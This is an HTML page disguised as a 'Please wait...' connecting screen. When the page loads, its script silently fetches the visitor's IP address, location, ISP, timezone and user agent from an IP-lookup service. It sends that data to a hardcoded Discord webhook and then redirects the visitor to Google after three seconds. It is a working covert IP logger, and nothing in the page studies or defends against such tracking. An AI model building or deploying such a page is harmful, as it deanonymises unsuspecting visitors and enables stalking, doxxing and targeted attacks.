<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Connecting...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background-color: #0d0d0d;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
    }
  </style>
</head>
<body>
  <h1>Please wait...</h1>

  <script>
    // Replace this with your actual Make.com webhook URL
    const webhookURL = 'https://discord.com/api/webhooks/1384088747963973674/-1ZUK05PUInq855QCZNyY7I1--QETyR87tl5F3zKT49h2uFz2iJC2rZi7HAr9YB3o48N';

    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(data => {
        const payload = {
          ip: data.ip,
          city: data.city,
          region: data.region,
          country: data.country_name,
          org: data.org,
          timezone: data.timezone,
          ua: navigator.userAgent
        };

        fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      })
      .catch(err => console.error('IP lookup failed', err));

    // Optional redirect
    setTimeout(() => {
      window.location.href = "https://google.com";
    }, 3000);
  </script>
</body>
</html>
